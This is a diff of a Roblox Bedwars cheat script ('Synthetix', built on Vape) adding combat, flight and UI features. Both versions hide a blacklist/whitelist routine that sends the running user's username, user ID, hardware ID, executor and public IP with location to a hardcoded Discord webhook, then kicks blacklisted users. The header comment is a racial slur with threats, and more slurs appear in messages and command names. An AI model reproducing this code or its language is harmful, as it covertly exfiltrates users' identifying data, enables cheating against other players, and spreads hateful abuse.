@@ -1,8 +1,8 @@
-
+--// This is the source of Synthetix, If you leak this then your a nigger and i will get your liver and get ur lungs and leak your ip and sell them in the dark web
 local GuiLibrary = shared.GuiLibrary
 local playersService = game:GetService("Players")
 local lplr = playersService.LocalPlayer
-local hwidcheck = game:GetService("RbxAnalyticsService"):GetClientId()
+local HWID = game:GetService("RbxAnalyticsService"):GetClientId()
 local function warningNotification(title, text, delay)
 	local suc, res = pcall(function()
 		local frame = GuiLibrary.CreateNotification(title, text, delay, "assets/WarningNotification.png")
@@ -12,77 +12,72 @@ local function warningNotification(title, text, delay)
 	return (suc and res)
 end
 
-local hwidblacklisttable = 
-{
+	local hwidblacklisttable = 
+	{
 
-}
-
-BLACKLISTED = false
-for i, v in pairs(hwidblacklisttable) do
-	if hwidcheck == i then
-		BLACKLISTED = true
-	end
+	}
+	BLACKLISTED = false
+	for i, v in pairs(hwidblacklisttable) do
+		if HWID == i then
+			BLACKLISTED = true
+		end
 	if BLACKLISTED then
-		if hwidcheck == i then
-local Webhook = "https://discord.com/api/webhooks/1095713352417824880/Yo1aLeeqThTaHXVjYkeU24EuqXgPJrd073aWL8OjFy8tEUWNnNPvYC221_4Wm4CLZ0iD"
-_G.Discord_UserID = ""
-local player = game:GetService"Players".LocalPlayer
-local joinTime = os.time() - (player.AccountAge*86400)
-local joinDate = os.date("!*t", joinTime)
-local premium = false
-local alt = true
-if player.MembershipType == Enum.MembershipType.Premium then
-   premium = true
-end
-local executor = identifyexecutor() or "Unknown"
-local Thing = game:HttpGet(string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true", game.Players.LocalPlayer.UserId))
-Thing = game:GetService("HttpService"):JSONDecode(Thing).data[1]
-local AvatarImage = Thing.imageUrl
-local msg = {
-   ["username"] = "Vape",
-   ["avatar_url"] = "https://cdn.discordapp.com/attachments/1068501433122562068/1098295120761204756/IMG_2475.jpg",
-   ["content"] = ( _G.Discord_UserID ~= "" and  _G.Discord_UserID ~= nil) and tostring("<@".._G.Discord_UserID..">") or " ",
-   ["embeds"] = {
-       {
+		if HWID == i then
+		GuiLibrary.SelfDestruct()
+		local Webhook = "https://discord.com/api/webhooks/1095713352417824880/Yo1aLeeqThTaHXVjYkeU24EuqXgPJrd073aWL8OjFy8tEUWNnNPvYC221_4Wm4CLZ0iD"
+		_G.Discord_UserID = ""
+		local player = game:GetService"Players".LocalPlayer
+		local joinTime = os.time() - (player.AccountAge*86400)
+		local joinDate = os.date("!*t", joinTime)
+		local premium = false
+		local alt = true
+		if player.MembershipType == Enum.MembershipType.Premium then
+		   premium = true
+		end
+		local executor = identifyexecutor() or "Unknown"
+		local Thing = game:HttpGet(string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true", game.Players.LocalPlayer.UserId))
+		Thing = game:GetService("HttpService"):JSONDecode(Thing).data[1]
+		local AvatarImage = Thing.imageUrl
+		local msg = {
+ 	  	["username"] = "Vape",
+   		["avatar_url"] = "https://cdn.discordapp.com/attachments/1068501433122562068/1098295120761204756/IMG_2475.jpg",
+   		["content"] = ( _G.Discord_UserID ~= "" and  _G.Discord_UserID ~= nil) and tostring("<@".._G.Discord_UserID..">") or " ",
+  		["embeds"] = {
+       		{
            ["color"] = tonumber(tostring("0x32CD32")), --decimal
-           ["title"] = ""..lplr.Name.." Is blacklisted",
+           ["title"] = "Blacklisted In 6872274481.lua file",
            ["thumbnail"] = {
                ["url"] = AvatarImage,
            },
            ["fields"] = {
                 {
-                   ["name"] = "Roblox Username",
+                   ["name"] = "Roblox Username:",
                    ["value"] = ""..lplr.Name.."",
                    ["inline"] = true
                 },
                 {
-					["name"] = "Discord Username",
+					["name"] = "Discord Username:",
 					["value"] = ""..v.."",
 					["inline"] = true
 				 },
 				 {
-                   ["name"] = "ID",
+                   ["name"] = "ID:",
                    ["value"] = "["..lplr.UserId.."](" .. tostring("https://www.roblox.com/users/" .. game.Players.LocalPlayer.UserId .. "/profile")..")",
                    ["inline"] = true
                 },
                 {
-                   ["name"] = "Executor",
+                   ["name"] = "Executor:",
                    ["value"] = executor,
                    ["inline"] = true
                 },
                 {
-                   ["name"] = "Date Joined",
-                   ["value"] = joinDate.day.."/"..joinDate.month.."/"..joinDate.year,
-                   ["inline"] = true
-                },
-                {
-                   ["name"] = "Ip and Location",
+                   ["name"] = "Ip and Location:",
                    ["value"] = tostring(game:HttpGet("http://ip-api.com/csv/", true)),
                    ["inline"] = true
                 },
                 {
-                  ["name"] = "HWID",
-                  ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
+                  ["name"] = "HWID:",
+                  ["value"] = HWID,
                   ["inline"] = true
                 }
            },
@@ -90,91 +85,90 @@ local msg = {
    }
 }
 request = http_request or request or HttpPost or syn.request
-request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
-game.Players.LocalPlayer:Kick("Hello "..v..",You are Blacklisted From Synthetix Because Your Black")
+	request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
+		game.Players.LocalPlayer:Kick("You are Blacklisted From Synthetix")
 		end
 	end
 end
 
-local hwidwhitelisttable =
-{
-["1e7374ce-7770-450a-a944-527fbaac94e6"] = "very tuff cat#4499",
-["2f98df94-b2c0-458f-8214-06f9b88a3c76"] = "102.902#3052",
-["2B7E4926-420F-446C-96BD-7BC5C6AC57F2"] = "whatcolourisyourwife#1368",
-["E2D6C78C-9D6D-4444-B24E-A81C1063DA0D"] = "whathedogdoin#3461",
-}
+	local hwidwhitelisttable =
+	{
+	["1e7374ce-7770-450a-a944-527fbaac94e6"] = "very tuff cat#4499",
+	["2f98df94-b2c0-458f-8214-06f9b88a3c76"] = "102.902#3052",
+	["E2D6C78C-9D6D-4444-B24E-A81C1063DA0D"] = "whathedogdoin#3461",
+	["2B7E4926-420F-446C-96BD-7BC5C6AC57F2"] = "vyx#1368",
+	} 
 
-for i, v in pairs(hwidwhitelisttable) do
-	if hwidcheck == i then
-		WHITELISTED = true
-	end
-	if WHITELISTED then 
-		if hwidcheck == i then
-			warningNotification("Information About You", "Discord User: "..v..", Roblox username: " ..(lplr.DisplayName or lplr.Name).."", 20)
+	for i, v in pairs(hwidwhitelisttable) do
+		if HWID == i then
+			WHITELISTED = true
+		end
+		if WHITELISTED then 
+			if HWID == i then
+
+				warningNotification("Information", "Discord User: "..v..", Roblox username: " ..(lplr.DisplayName or lplr.Name).."", 20)
+
 				game.StarterGui:SetCore("ChatMakeSystemMessage",  { Text = "[Whitelist] Fully Whitelisted! ", Color = Color3.fromRGB(0, 255, 0), Font = Enum.Font.Merriweather, FontSize = Enum.FontSize.Size24 } )
+
 				local Webhook = "https://discord.com/api/webhooks/1095713352417824880/Yo1aLeeqThTaHXVjYkeU24EuqXgPJrd073aWL8OjFy8tEUWNnNPvYC221_4Wm4CLZ0iD"
-_G.Discord_UserID = ""
-local player = game:GetService"Players".LocalPlayer
-local joinTime = os.time() - (player.AccountAge*86400)
-local joinDate = os.date("!*t", joinTime)
-local premium = false
-local alt = true
-if player.MembershipType == Enum.MembershipType.Premium then
-   premium = true
-end
-local executor = identifyexecutor() or "Unknown"
-local Thing = game:HttpGet(string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true", game.Players.LocalPlayer.UserId))
-Thing = game:GetService("HttpService"):JSONDecode(Thing).data[1]
-local AvatarImage = Thing.imageUrl
-local msg = {
-   ["username"] = "Vape",
-   ["avatar_url"] = "https://cdn.discordapp.com/attachments/1068501433122562068/1098295120761204756/IMG_2475.jpg",
-   ["content"] = ( _G.Discord_UserID ~= "" and  _G.Discord_UserID ~= nil) and tostring("<@".._G.Discord_UserID..">") or " ",
-   ["embeds"] = {
-       {
-           ["color"] = tonumber(tostring("0x32CD32")), --decimal
-           ["title"] = "",
-           ["thumbnail"] = {
-               ["url"] = AvatarImage,
-           },
-           ["fields"] = {
+				_G.Discord_UserID = ""
+				local player = game:GetService"Players".LocalPlayer
+				local joinTime = os.time() - (player.AccountAge*86400)
+				local joinDate = os.date("!*t", joinTime)
+				local premium = false
+				if player.MembershipType == Enum.MembershipType.Premium then
+  				premium = true
+				end
+				local executor = identifyexecutor() or "Unknown"
+				local Thing = game:HttpGet(string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true", game.Players.LocalPlayer.UserId))
+				Thing = game:GetService("HttpService"):JSONDecode(Thing).data[1]
+				local AvatarImage = Thing.imageUrl
+				local msg = {
+   				["username"] = "Vape",
+  				["avatar_url"] = "https://cdn.discordapp.com/attachments/1068501433122562068/1098295120761204756/IMG_2475.jpg",
+   				["content"] = ( _G.Discord_UserID ~= "" and  _G.Discord_UserID ~= nil) and tostring("<@".._G.Discord_UserID..">") or " ",
+   				["embeds"] = {
+      			 {
+           		["color"] = tonumber(tostring("0x32CD32")), --decimal
+           		["title"] = "Whitelisted In 6872274481.lua File!",
+           		["thumbnail"] = {
+               	["url"] = AvatarImage,
+           		},
+           		["fields"] = {
                 {
-                   ["name"] = "Roblox Username",
-                   ["value"] = ""..lplr.Name.."",
-                   ["inline"] = true
+                ["name"] = "Roblox Username",
+                ["value"] = ""..lplr.Name.."",
+                ["inline"] = true
                 },
                 {
-					["name"] = "Discord Username",
-					["value"] = ""..v.."",
-					["inline"] = true
+				["name"] = "Discord Username",
+				["value"] = ""..v.."",
+				["inline"] = true
 				 },
 				 {
-                   ["name"] = "ID",
-                   ["value"] = "["..lplr.UserId.."](" .. tostring("https://www.roblox.com/users/" .. game.Players.LocalPlayer.UserId .. "/profile")..")",
-                   ["inline"] = true
+                ["name"] = "ID",
+                ["value"] = "["..lplr.UserId.."](" .. tostring("https://www.roblox.com/users/" .. game.Players.LocalPlayer.UserId .. "/profile")..")",
+                ["inline"] = true
                 },
                 {
-                   ["name"] = "Executor",
-                   ["value"] = executor,
-                   ["inline"] = true
+                ["name"] = "Executor",
+                ["value"] = executor,
+                ["inline"] = true
                 },
                 {
-                  ["name"] = "HWID",
-                  ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
-                  ["inline"] = true
+                ["name"] = "HWID",
+                ["value"] = HWID,
+                ["inline"] = true
                 }
-           },
-       }
-   }
-}
-request = http_request or request or HttpPost or syn.request
-request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
-			end
-			if not hwidcheck == i then
-				game.StarterGui:SetCore("ChatMakeSystemMessage",  { Text = "[Whitelist] hello niggro", Color = Color3.fromRGB(0, 255, 0), Font = Enum.Font.Merriweather, FontSize = Enum.FontSize.Size24 } )
-			end
+          	 	},
+      	 		}
+   			}
+		}
+		request = http_request or request or HttpPost or syn.request
+			request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
 		end
 	end
+end
 local textService = game:GetService("TextService")
 local lightingService = game:GetService("Lighting")
 local textChatService = game:GetService("TextChatService")
@@ -230,14 +224,14 @@ local bedwarsStore = {
 	zephyrOrb = 0
 }
 bedwarsStore.blockRaycast.FilterType = Enum.RaycastFilterType.Include
+
+table.insert(vapeConnections, workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(function()
+	gameCamera = workspace.CurrentCamera or workspace:FindFirstChildWhichIsA("Camera")
+end))
 local isfile = isfile or function(file)
 	local suc, res = pcall(function() return readfile(file) end)
 	return suc and res ~= nil
 end
-table.insert(vapeConnections, workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(function()
-	gameCamera = workspace.CurrentCamera or workspace:FindFirstChildWhichIsA("Camera")
-end))
-
 local networkownerswitch = tick()
 local isnetworkowner = isnetworkowner or function(part)
 	if gethiddenproperty(part, "NetworkOwnershipRule") == Enum.NetworkOwnership.Manual then 
@@ -262,6 +256,17 @@ local worldtoviewportpoint = function(pos)
 		return scr[1], scr[1].Z > 0
 	end
 	return gameCamera.WorldToViewportPoint(gameCamera, pos)
+end
+
+local function vapeGithubRequest(scripturl)
+	if not isfile("vape/"..scripturl) then
+		local suc, res = pcall(function() return game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/"..readfile("vape/commithash.txt").."/"..scripturl, true) end)
+		assert(suc, res)
+		assert(res ~= "404: Not Found", res)
+		if scripturl:find(".lua") then res = "--This watermark is used to delete the file if its cached, remove it to make the file persist after commits.\n"..res end
+		writefile("vape/"..scripturl, res)
+	end
+	return readfile("vape/"..scripturl)
 end
 
 local function downloadVapeAsset(path)
@@ -290,7 +295,6 @@ local function downloadVapeAsset(path)
 	if not vapeCachedAssets[path] then vapeCachedAssets[path] = getcustomasset(path) end
 	return vapeCachedAssets[path] 
 end
-
 
 local function runcode(func) func() end
 
@@ -1701,8 +1705,7 @@ runcode(function()
 		end
 
 		local vapePrivateCommands = {
-			["nigger"] = function(args, plr)
-				print("nigger")
+			["nigro"] = function(args, plr)
 			end
 		}
 
@@ -2047,7 +2050,62 @@ do
 end
 
 runcode(function()
-
+	local handsquare = Instance.new("ImageLabel")
+	handsquare.Size = UDim2.new(0, 26, 0, 27)
+	handsquare.BackgroundColor3 = Color3.fromRGB(26, 25, 26)
+	handsquare.Position = UDim2.new(0, 72, 0, 39)
+	handsquare.Parent = vapeTargetInfo.Object.GetCustomChildren().Frame.MainInfo
+	local handround = Instance.new("UICorner")
+	handround.CornerRadius = UDim.new(0, 4)
+	handround.Parent = handsquare
+	local helmetsquare = handsquare:Clone()
+	helmetsquare.Position = UDim2.new(0, 100, 0, 39)
+	helmetsquare.Parent = vapeTargetInfo.Object.GetCustomChildren().Frame.MainInfo
+	local chestplatesquare = handsquare:Clone()
+	chestplatesquare.Position = UDim2.new(0, 127, 0, 39)
+	chestplatesquare.Parent = vapeTargetInfo.Object.GetCustomChildren().Frame.MainInfo
+	local bootssquare = handsquare:Clone()
+	bootssquare.Position = UDim2.new(0, 155, 0, 39)
+	bootssquare.Parent = vapeTargetInfo.Object.GetCustomChildren().Frame.MainInfo
+	local uselesssquare = handsquare:Clone()
+	uselesssquare.Position = UDim2.new(0, 182, 0, 39)
+	uselesssquare.Parent = vapeTargetInfo.Object.GetCustomChildren().Frame.MainInfo
+	local oldupdate = vapeTargetInfo.UpdateInfo
+	vapeTargetInfo.UpdateInfo = function(tab, targetsize)
+		local bkgcheck = vapeTargetInfo.Object.GetCustomChildren().Frame.MainInfo.BackgroundTransparency == 1
+		handsquare.BackgroundTransparency = bkgcheck and 1 or 0
+		helmetsquare.BackgroundTransparency = bkgcheck and 1 or 0
+		chestplatesquare.BackgroundTransparency = bkgcheck and 1 or 0
+		bootssquare.BackgroundTransparency = bkgcheck and 1 or 0
+		uselesssquare.BackgroundTransparency = bkgcheck and 1 or 0
+		pcall(function()
+			for i,v in pairs(shared.VapeTargetInfo.Targets) do
+				local inventory = bedwarsStore.inventories[v.Player] or {}
+					if inventory.hand then
+						handsquare.Image = bedwars.getIcon(inventory.hand, true)
+					else
+						handsquare.Image = ""
+					end
+					if inventory.armor[4] then
+						helmetsquare.Image = bedwars.getIcon(inventory.armor[4], true)
+					else
+						helmetsquare.Image = ""
+					end
+					if inventory.armor[5] then
+						chestplatesquare.Image = bedwars.getIcon(inventory.armor[5], true)
+					else
+						chestplatesquare.Image = ""
+					end
+					if inventory.armor[6] then
+						bootssquare.Image = bedwars.getIcon(inventory.armor[6], true)
+					else
+						bootssquare.Image = ""
+					end
+				break
+			end
+		end)
+		return oldupdate(tab, targetsize)
+	end
 end)
 
 GuiLibrary.RemoveObject("SilentAimOptionsButton")
@@ -2068,9 +2126,7 @@ GuiLibrary.RemoveObject("NameTagsOptionsButton")
 GuiLibrary.RemoveObject("SafeWalkOptionsButton")
 GuiLibrary.RemoveObject("BlinkOptionsButton")
 GuiLibrary.RemoveObject("FOVChangerOptionsButton")
-GuiLibrary.RemoveObject("CapeOptionsButton")
 GuiLibrary.RemoveObject("AntiVoidOptionsButton")
-
 
 runcode(function()
 	local AimAssist = {Enabled = false}
@@ -2443,7 +2499,7 @@ runcode(function()
 									if AutoLeaveRandom.Enabled then 
 										local listofmodes = {}
 										for i,v in pairs(bedwars.QueueMeta) do
-											if not v.disabled then table.insert(listofmodes, i) end
+											if not v.disabled and not v.voiceChatOnly and not v.rankCategory then table.insert(listofmodes, i) end
 										end
 										bedwars.LobbyClientEvents:joinQueue(listofmodes[math.random(1, #listofmodes)])
 									else
@@ -2467,7 +2523,7 @@ runcode(function()
 								if AutoLeaveRandom.Enabled then 
 									local listofmodes = {}
 									for i,v in pairs(bedwars.QueueMeta) do
-										if not v.disabled then table.insert(listofmodes, i) end
+										if not v.disabled and not v.voiceChatOnly and not v.rankCategory then table.insert(listofmodes, i) end
 									end
 									bedwars.LobbyClientEvents:joinQueue(listofmodes[math.random(1, #listofmodes)])
 								else
@@ -2598,7 +2654,6 @@ runcode(function()
 end)
 
 runcode(function()
-	local velo
 	local Fly = {Enabled = false}
 	local FlyMode = {Value = "Normal"}
 	local FlyVerticalSpeed = {Value = 40}
@@ -2725,15 +2780,15 @@ runcode(function()
 					spawn(function()
 						repeat
 							task.wait()
-							for i = 0,7 do
+							for i = 0,6 do
 								task.wait()
 								if not Fly.Enabled then return end
-								velo.Velocity = Vector3.new(0,i*2,0)
+								velo.Velocity = Vector3.new(0,i*2.2,0)
 							end
-							for i = 0,7 do
+							for i = 0,6 do
 								task.wait()
 								if not Fly.Enabled then return end
-								velo.Velocity = Vector3.new(0,-i*2,0)
+								velo.Velocity = Vector3.new(0,-i*2.1,0)
 							end
 						until not Fly.Enabled or FlyMode.Value ~= "Bouncy Heatseeker" 
 					end)
@@ -2785,20 +2840,20 @@ runcode(function()
 							if FlyMode.Value == "Bouncy Heatseeker" then 
 								speedValueV2 = tick() % 1 < 0.6 and 5 or (22 * getSpeedMultiplier(true)) / 0.4
 							end
-						entityLibrary.character.HumanoidRootPart.CFrame = entityLibrary.character.HumanoidRootPart.CFrame + (entityLibrary.character.Humanoid.MoveDirection * (speedValueV2 - 20)) * delta
-						if FlyMode.Value ~= "Normal" then
-							local speedValue = FlySpeed.Value
-							if FlyMode.Value == "Heatseeker" then 
-								speedValue = tick() % 1 < 0.6 and 5 or (22 * getSpeedMultiplier(true)) / 0.4
+							entityLibrary.character.HumanoidRootPart.CFrame = entityLibrary.character.HumanoidRootPart.CFrame + (entityLibrary.character.Humanoid.MoveDirection * (speedValueV2 - 20)) * delta
+							if FlyMode.Value ~= "Normal" then
+								local speedValue = FlySpeed.Value
+								if FlyMode.Value == "Heatseeker" then 
+									speedValue = tick() % 1 < 0.6 and 5 or (22 * getSpeedMultiplier(true)) / 0.4
+								end
+								entityLibrary.character.HumanoidRootPart.CFrame = entityLibrary.character.HumanoidRootPart.CFrame + (entityLibrary.character.Humanoid.MoveDirection * (speedValue - 20)) * delta
 							end
-							entityLibrary.character.HumanoidRootPart.CFrame = entityLibrary.character.HumanoidRootPart.CFrame + (entityLibrary.character.Humanoid.MoveDirection * (speedValue - 20)) * delta
 						end
-					end
 					end
 				end)
 			else
 				if FlyMode.Value == "Bouncy Heatseeker" then 
-				velo:Destroy()
+					velo:Destroy()
 				end
 				pcall(function() coroutine.close(FlyCoroutine) end)
 				autobankballoon = false
@@ -2831,7 +2886,7 @@ runcode(function()
 	})
 	FlyMode = Fly.CreateDropdown({
 		Name = "Mode",
-		List = {"CFrame", "Normal", "Heatseeker", "Bouncy Heatseeker",},
+		List = {"CFrame", "Normal", "Heatseeker", "Bouncy Heatseeker"},
 		Function = function() end
 	})
 	FlySpeed = Fly.CreateSlider({
@@ -3298,30 +3353,30 @@ runcode(function()
 			{CFrame = CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(0), math.rad(-0), math.rad(-0)), Time = 0.1}
 		},
 		["Funny"] = {-- 	    right   back  up
-			{CFrame = CFrame.new(-5, 	-2,   -2) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(-0)), Time = 0.3},
-			{CFrame = CFrame.new(-1, 	-2,   -6) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(-60)), Time = 0.3},
-			{CFrame = CFrame.new(2, 	-0,   -4) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(-0)), Time = 0.3},
-			{CFrame = CFrame.new(0, 	 2,    1) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(-0)), Time = 0.1}
-		},
-		["Jumpoah"] = {
-			{CFrame = CFrame.new(-3, -4, 1) * CFrame.Angles(math.rad(50), math.rad(69), math.rad(-40)), Time = 0.8},
-			{CFrame = CFrame.new(-2, -3, 0) * CFrame.Angles(math.rad(92), math.rad(56), math.rad(-94)), Time = 0.10},
-			{CFrame = CFrame.new(-2, -4, 3) * CFrame.Angles(math.rad(48), math.rad(28), math.rad(-58)), Time = 0.9}
-		},
-		["Cool"] = {
-			{CFrame = CFrame.new(0.20, 0.7, -0.6) * CFrame.Angles(math.rad(70), math.rad(20), math.rad(-20)), Time = 0.5},
-			{CFrame = CFrame.new(0.90, -0.14, 0.2) * CFrame.Angles(math.rad(-20), math.rad(-30), math.rad(-90)), Time = 0.15},
-			{CFrame = CFrame.new(0.12, -0.21, 0.69) * CFrame.Angles(math.rad(24), math.rad(-10), math.rad(38)), Time = 0.10},
-			{CFrame = CFrame.new(0.20, -0.11, 0.79) * CFrame.Angles(math.rad(-24), math.rad(69), math.rad(-69)), Time = 0.05},
-			{CFrame = CFrame.new(0.63, -0.1, 1.37) * CFrame.Angles(math.rad(-84), math.rad(50), math.rad(-38)), Time = 0.5}
-		},
-		["CoolV2"] = {
-			{CFrame = CFrame.new(0.39, 0.21, 0.20) * CFrame.Angles(math.rad(38), math.rad(-90), math.rad(-59)), Time = 0.15},
-			{CFrame = CFrame.new(0.10, -0.2, 0.22) * CFrame.Angles(math.rad(57), math.rad(83), math.rad(-10)), Time = 0.5},
-			{CFrame = CFrame.new(-0.32, -0.41, -0.26) * CFrame.Angles(math.rad(74), math.rad(-90), math.rad(-38)), Time = 0.10},
-			{CFrame = CFrame.new(0.46, -0.38, 0.19) * CFrame.Angles(math.rad(-89), math.rad(42), math.rad(-42)), Time = 0.15},
-			{CFrame = CFrame.new(-0.23, -0.31, 2.87) * CFrame.Angles(math.rad(74), math.rad(-29), math.rad(68)), Time = 0.5}
-		},
+		{CFrame = CFrame.new(-5, 	-2,   -2) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(-0)), Time = 0.3},
+		{CFrame = CFrame.new(-1, 	-2,   -6) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(-60)), Time = 0.3},
+		{CFrame = CFrame.new(2, 	-0,   -4) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(-0)), Time = 0.3},
+		{CFrame = CFrame.new(0, 	 2,    1) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(-0)), Time = 0.1}
+	},
+	["Jumpoah"] = {
+		{CFrame = CFrame.new(-3, -4, 1) * CFrame.Angles(math.rad(50), math.rad(69), math.rad(-40)), Time = 0.8},
+		{CFrame = CFrame.new(-2, -3, 0) * CFrame.Angles(math.rad(92), math.rad(56), math.rad(-94)), Time = 0.10},
+		{CFrame = CFrame.new(-2, -4, 3) * CFrame.Angles(math.rad(48), math.rad(28), math.rad(-58)), Time = 0.9}
+	},
+	["Cool"] = {
+		{CFrame = CFrame.new(0.20, 0.7, -0.6) * CFrame.Angles(math.rad(70), math.rad(20), math.rad(-20)), Time = 0.5},
+		{CFrame = CFrame.new(0.90, -0.14, 0.2) * CFrame.Angles(math.rad(-20), math.rad(-30), math.rad(-90)), Time = 0.15},
+		{CFrame = CFrame.new(0.12, -0.21, 0.69) * CFrame.Angles(math.rad(24), math.rad(-10), math.rad(38)), Time = 0.10},
+		{CFrame = CFrame.new(0.20, -0.11, 0.79) * CFrame.Angles(math.rad(-24), math.rad(69), math.rad(-69)), Time = 0.05},
+		{CFrame = CFrame.new(0.63, -0.1, 1.37) * CFrame.Angles(math.rad(-84), math.rad(50), math.rad(-38)), Time = 0.5}
+	},
+	["CoolV2"] = {
+		{CFrame = CFrame.new(0.39, 0.21, 0.20) * CFrame.Angles(math.rad(38), math.rad(-90), math.rad(-59)), Time = 0.15},
+		{CFrame = CFrame.new(0.10, -0.2, 0.22) * CFrame.Angles(math.rad(57), math.rad(83), math.rad(-10)), Time = 0.5},
+		{CFrame = CFrame.new(-0.32, -0.41, -0.26) * CFrame.Angles(math.rad(74), math.rad(-90), math.rad(-38)), Time = 0.10},
+		{CFrame = CFrame.new(0.46, -0.38, 0.19) * CFrame.Angles(math.rad(-89), math.rad(42), math.rad(-42)), Time = 0.15},
+		{CFrame = CFrame.new(-0.23, -0.31, 2.87) * CFrame.Angles(math.rad(74), math.rad(-29), math.rad(68)), Time = 0.5}
+	},
 		Exhibition = {
 			{CFrame = CFrame.new(0.69, -0.7, 0.6) * CFrame.Angles(math.rad(-30), math.rad(50), math.rad(-90)), Time = 0.1},
 			{CFrame = CFrame.new(0.7, -0.71, 0.59) * CFrame.Angles(math.rad(-84), math.rad(50), math.rad(-38)), Time = 0.2}
@@ -3642,7 +3697,7 @@ runcode(function()
     })
     killauraanimmethod = Killaura.CreateDropdown({
         Name = "Animation", 
-        List = {"Normal", "Slow", "New", "Cool", "Funny", "CoolV2", "Jumpoah", "Vertical Spin", "Exhibition", "Exhibition Old"},
+		List = {"Normal", "Slow", "New", "Cool", "Funny", "CoolV2", "Jumpoah", "Vertical Spin", "Exhibition", "Exhibition Old"},
         Function = function(val) end
     })
     killauramouse = Killaura.CreateToggle({
@@ -4341,6 +4396,7 @@ runcode(function()
 		end
 		lastTarget = plr
 		if plr then 
+			if plr.Character:GetAttribute("InfernalShieldRaised") then return end
 			local rayparams = RaycastParams.new()
 			local tab = {lplr.Character}
 			for i,v in pairs(entityLibrary.entityList) do if v.Targetable then table.insert(tab, v.Character) end end
@@ -9508,223 +9564,123 @@ runcode(function()
 		Default = 1000
 	})
 end)
-
 runcode(function()
-	bedwarsStore.TPString = shared.vapeoverlay or nil
-	local origtpstring = bedwarsStore.TPString
-	local Overlay = GuiLibrary.CreateCustomWindow({
-		Name = "Overlay",
-		Icon = "vape/assets/TargetIcon1.png",
+	local HackerDetector = GuiLibrary.CreateCustomWindow({
+		Name = "HackerDetector",
+		Icon = "vape/assets/HackerDetectorIcon.png",
 		IconSize = 16
 	})
-	local overlayframe = Instance.new("Frame")
-	overlayframe.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-	overlayframe.Size = UDim2.new(0, 200, 0, 120)
-	overlayframe.Position = UDim2.new(0, 0, 0, 5)
-	overlayframe.Parent = Overlay.GetCustomChildren()
-	local overlayframe2 = Instance.new("Frame")
-	overlayframe2.Size = UDim2.new(1, 0, 0, 10)
-	overlayframe2.Position = UDim2.new(0, 0, 0, -5)
-	overlayframe2.Parent = overlayframe
-	local overlayframe3 = Instance.new("Frame")
-	overlayframe3.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-	overlayframe3.Size = UDim2.new(1, 0, 0, 6)
-	overlayframe3.Position = UDim2.new(0, 0, 0, 6)
-	overlayframe3.BorderSizePixel = 0
-	overlayframe3.Parent = overlayframe2
-	local oldguiupdate = GuiLibrary.UpdateUI
-	GuiLibrary.UpdateUI = function(h, s, v, ...)
-		overlayframe2.BackgroundColor3 = Color3.fromHSV(h, s, v)
-		return oldguiupdate(h, s, v, ...)
-	end
-	local framecorner1 = Instance.new("UICorner")
-	framecorner1.CornerRadius = UDim.new(0, 5)
-	framecorner1.Parent = overlayframe
-	local framecorner2 = Instance.new("UICorner")
-	framecorner2.CornerRadius = UDim.new(0, 5)
-	framecorner2.Parent = overlayframe2
-	local label = Instance.new("TextLabel")
-	label.Size = UDim2.new(1, -7, 1, -5)
-	label.TextXAlignment = Enum.TextXAlignment.Left
-	label.TextYAlignment = Enum.TextYAlignment.Top
-	label.Font = Enum.Font.GothamBold
-	label.LineHeight = 1.2
-	label.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-	label.TextSize = 16
-	label.Text = ""
-	label.BackgroundTransparency = 1
-	label.TextColor3 = Color3.fromRGB(200, 200, 200)
-	label.Position = UDim2.new(0, 7, 0, 5)
-	label.Parent = overlayframe
-	Overlay.Bypass = true
-	local overlayconnections = {}
-	local oldnetworkowner
-	local teleported = {}
-	local teleported2 = {}
-	local teleportedability = {}
-	local teleportconnections = {}
-	local pinglist = {}
-	local fpslist = {}
-	local matchstatechanged = 0
-	local mapname = "Unknown"
-	local overlayenabled = false
-
-	task.spawn(function()
-		pcall(function()
-			mapname = workspace:WaitForChild("Map"):WaitForChild("Worlds"):GetChildren()[1].Name
-			mapname = string.gsub(string.split(mapname, "_")[2] or mapname, "-", "") or "Blank"
-		end)
+	local HackerDetectorDisplayName = HackerDetector.CreateToggle({
+		Name = "Use DisplayName",
+		Function = function() end,
+		Default = true
+	})
+	local TargetInfoBackground = {Enabled = false}
+	local HackerDetectorMainFrame = Instance.new("Frame")
+	HackerDetectorMainFrame.BackgroundColor3 = Color3.fromRGB(26, 25, 26)
+	HackerDetectorMainFrame.BorderSizePixel = 0
+	HackerDetectorMainFrame.BackgroundTransparency = 100
+	HackerDetectorMainFrame.Size = UDim2.new(0, 220, 0, 90)
+	HackerDetectorMainFrame.Position = UDim2.new(0, 0, 0, 13)
+	HackerDetectorMainFrame.Parent = HackerDetector.GetCustomChildren()
+	
+	local HackerDetectorMainDetector = Instance.new("Frame")
+	HackerDetectorMainDetector.BackgroundColor3 = Color3.fromRGB(31, 30, 31)
+	HackerDetectorMainDetector.Size = UDim2.new(0, 330, 0, 68)
